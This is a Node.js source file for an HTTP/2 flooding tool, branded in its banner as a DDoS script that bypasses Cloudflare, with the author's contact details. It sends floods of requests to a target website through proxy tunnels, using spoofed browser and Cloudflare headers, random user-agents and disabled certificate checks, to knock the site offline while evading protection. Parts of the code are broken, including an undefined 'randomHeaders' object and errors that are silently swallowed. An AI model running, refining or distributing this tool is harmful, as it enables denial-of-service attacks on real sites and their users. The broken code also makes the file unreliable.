const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 var colors = require("colors");
 const { HeaderGenerator } = require('header-generator');
 const readline = require('readline');

 // Tối ưu hóa cho máy 64GB RAM, 16 Core
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 
 // Tăng heap size cho Node.js
 const v8 = require('v8');
 v8.setFlagsFromString('--max-old-space-size=32768'); // 32GB heap
 
 // Tối ưu hóa garbage collector
 v8.setFlagsFromString('--expose-gc');
 v8.setFlagsFromString('--max-semi-space-size=512');
 
 // Tăng file descriptor limit
 const os = require('os');
 if (os.platform() === 'win32') {
     // Windows optimization
     process.env.UV_THREADPOOL_SIZE = 64;
 } else {
     // Linux/Mac optimization
     process.env.UV_THREADPOOL_SIZE = 64;
     require('child_process').execSync('ulimit -n 65536', {stdio: 'inherit'});
 }

 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`node flood Target Host Time Requests Thead ProxyFile`.rainbow); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 };
 dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
],
cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
],
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
],
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
]
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 let headerGenerator = new HeaderGenerator({
     browsers: [
         {name: "firefox", minVersion: 100, httpVersion: "2"},
     ],
     devices: [
         "desktop",
     ],
     operatingSystems: [
         "windows",
     ],
     locales: ["en-US", "en"]
 });

 if (cluster.isMaster && process.argv.length < 7) {
    // Giao diện nhập dạng tree
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    let inputData = {};
    rl.question('│   ├─── URL: '.rainbow, (url) => {
        inputData.url = url.trim();
        rl.question('│   ├─── THREADS: '.rainbow, (threads) => {
            inputData.threads = threads.trim();
            rl.question('│   ├─── TIME: '.rainbow, (time) => {
                inputData.time = time.trim();
                rl.question('│   ├─── RATE: '.rainbow, (rate) => {
                    inputData.rate = rate.trim();
                    rl.question('│   ├─── PROXY FILE: '.rainbow, (proxy) => {
                        inputData.proxy = proxy.trim();
                        rl.close();
                        // Gán lại process.argv để dùng lại logic cũ
                        process.argv[2] = inputData.url;
                        process.argv[3] = inputData.time;
                        process.argv[4] = inputData.rate;
                        process.argv[5] = inputData.threads;
                        process.argv[6] = inputData.proxy;
                        // Tiếp tục chạy tool như bình thường
                        require('child_process').fork(__filename, [
                            inputData.url,
                            inputData.time,
                            inputData.rate,
                            inputData.threads,
                            inputData.proxy
                        ]);
                        process.exit();
                    });
                });
            });
        });
    });
    return;
}

 if (cluster.isMaster) {
    // Tạo banner đẹp
    function centerText(text, width) {
        const len = text.replace(/\u001b\[[0-9;]*m/g, '').length;
        if (len >= width) return text;
        const left = Math.floor((width - len) / 2);
        const right = width - len - left;
        return ' '.repeat(left) + text + ' '.repeat(right);
    }
    const boxWidth = 60;
    const top = '╔' + '═'.repeat(boxWidth) + '╗';
    const empty = '║' + ' '.repeat(boxWidth) + '║';
    const sep = '╟' + '─'.repeat(boxWidth) + '╢';
    const bottom = '╚' + '═'.repeat(boxWidth) + '╝';
    const toolName = '🚀 Script DDoS Bypass Cloudflare';
    const contact = '🆔 Telegram: @everything182   ☎️ Zalo: 0877667153';
    const credit = 'Developed & Maintained by Phạm Xuân Tiến 🛠️';
    // Thông số
    const target = `🎯 Target     : ${args.target}`;
    const duration = `⏱️  Duration   : ${args.time}`;
    const rate = `🚀 Rate       : ${args.Rate}`;
    const threads = `🧵 Threads    : ${args.threads}`;
    const proxy = `🌐 Proxy List : ${args.proxyFile}`;
    // In banner
    console.clear();
    console.log(top.rainbow);
    console.log(empty.rainbow);
    console.log(('║' + centerText(toolName, boxWidth) + '║').rainbow);
    console.log(empty.rainbow);
    console.log(('║' + centerText(contact, boxWidth) + '║').rainbow);
    console.log(empty.rainbow);
    console.log(('║' + centerText(credit, boxWidth) + '║').rainbow);
    console.log(empty.rainbow);
    console.log(sep.rainbow);
    // In thông số
    const infoLines = [target, duration, rate, threads, proxy];
    for (const line of infoLines) {
        const pad = boxWidth - line.replace(/\u001b\[[0-9;]*m/g, '').length;
        console.log(('║  ' + line + ' '.repeat(pad - 2) + '║').rainbow);
    }
    console.log(bottom.rainbow);
    cluster.fork();
    for (let counter = 2; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 10000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 function getRandomUserAgent() {
    const osList = ['Windows', 'Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Windows', 'Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = btoa(userAgentString);
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
      if (i % randomOrder === 0) {
        finalString += encryptedString.charAt(i);
      } else {
        finalString += encryptedString.charAt(i).toUpperCase();
      }
    }
    return finalString;
  }

 const Header = new NetSocket();
 headers[":method"] = "GET";
 headers["GET"] = "/HTTP/2";
 headers["cache-control"]= cache_header[Math.floor(Math.random() * cache_header.length)];
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["cf-mitigated"] = "challenge";
 headers["content-type"] = "text/html; charset=UTF-8";
 headers["Referer"] = "https://google.com";
 headers["accept"] = randomHeaders['accept'];
 headers["accept-language"] = randomHeaders['accept-language'];
 headers["accept-encoding"] = randomHeaders['accept-encoding'];
 headers["Connection"] = "keep-alive";
 headers["upgrade-insecure-requests"] = randomHeaders['upgrade-insecure-requests'];
 headers["TE"] = "trailers";
 headers["cdn-loop"] = "cloudflare";
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["origin-agent-cluster"] = "?1";
 headers["sec-fetch-user"] = "?1";
 headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
 headers["sec-fetch-mode"]= mode_header[Math.floor(Math.random() * mode_header.length)];
 headers["sec-fetch-site"]= site_header[Math.floor(Math.random() * site_header.length)];
 headers["cookie"]= randomHeaders['cookie'];
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const userAgentv2 = new UserAgent();
     var useragent = userAgentv2.toString();
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = getRandomUserAgent();
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100
     };

     Header.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);

         const tlsOptions = {
            ALPNProtocols: ['h2'],
            followAllRedirects: true,
            challengeToSolve: 5,
            clientTimeout: 5000,
            clientlareMaxTimeout: 25000,
            echdCurve: "GREASE:X25519:x25519",
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
            rejectUnauthorized: false,
            socket: connection,
            decodeEmails: false,
            honorCipherOrder: true,
            requestCert: true,
            secure: true,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 1000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 100,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 100,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
         
 
client.on("connect", () => {
    const IntervalAttack = setInterval(() => {
        // T ng s? l ?ng y u c?u
        for (let i = 0; i < args.Rate * 1; i++) {
            // T?o y u c?u v?i c c headers ng?u nhi n
            headers["extra-header"] = "value" + i;
            
            const request = client.request(headers)
                .on("response", response => {
                    request.close();
                    request.destroy();
                    return;
                });

            request.end();
        }
    }, 1000);
});
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);